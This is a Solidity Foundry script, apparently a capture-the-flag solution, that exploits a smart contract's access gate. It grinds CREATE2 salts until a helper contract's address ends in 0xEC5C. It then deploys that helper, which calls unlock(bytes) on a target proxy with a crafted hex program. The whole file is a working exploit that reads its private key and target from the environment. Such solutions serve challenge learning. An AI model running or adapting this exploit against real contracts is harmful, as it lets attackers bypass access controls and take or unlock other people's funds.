// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Script.sol";

contract GateBreaker {
    bytes constant VM_PROG = hex"01ca0501fe030501ba030501be0300ffffffffffff"; // length = 21

    address immutable proxy;
    constructor(address _proxy) {
        proxy = _proxy;
    }

    fallback() external payable {
        (bool ok, ) = proxy.call(
            abi.encodeWithSignature("unlock(bytes)", VM_PROG)
        );
        require(ok, "unlock failed");
    }
}

/* -------------------------------------------------------------------------
 *  Minimal CREATE2 factory (stable deployer address)
 * ---------------------------------------------------------------------- */
contract Create2Factory {
    function deploy(
        bytes32 salt,
        bytes memory code
    ) external returns (address a) {
        assembly {
            a := create2(0, add(code, 0x20), mload(code), salt)
            if iszero(extcodesize(a)) {
                revert(0, 0)
            }
        }
    }
}

contract Solve is Script {
    function run() external {
        /* --- environment --- */
        uint256 pk = vm.envUint("PRIVATE_KEY");
        address proxy = vm.envAddress("PROXY");

        vm.startBroadcast(pk);

        /* 1. Deploy factory */
        Create2Factory factory = new Create2Factory();
        address deployer = address(factory);
        console2.log("Factory:", deployer);

        /* 2. Prepare GateBreaker init‑code */
        bytes memory init = abi.encodePacked(
            type(GateBreaker).creationCode,
            abi.encode(proxy)
        );
        bytes32 initHash = keccak256(init);

        /* 3. Find salt so helper address ends with 0xEC5C */
        bytes32 salt;
        address helperPred;
        for (uint256 i; ; ++i) {
            salt = bytes32(i);
            helperPred = _predict(deployer, salt, initHash);
            if (uint16(uint160(helperPred)) == 0xEC5C) break;
        }
        console2.log("Salt :", uint256(salt));
        console2.log("Predicted helper:", helperPred);

        /* 4. Deploy helper */
        address helper = factory.deploy(salt, init);
        require(helper == helperPred, "CREATE2 mismatch");
        console2.log("Helper deployed  :", helper);

        /* 5. Trigger exploit once */
        (bool ok, ) = helper.call("");
        require(ok, "helper call failed");
        console2.log("Unlocked");

        vm.stopBroadcast();
    }

    function _predict(
        address deployer,
        bytes32 salt,
        bytes32 initHash
    ) internal pure returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xff),
                                deployer,
                                salt,
                                initHash
                            )
                        )
                    )
                )
            );
    }
}
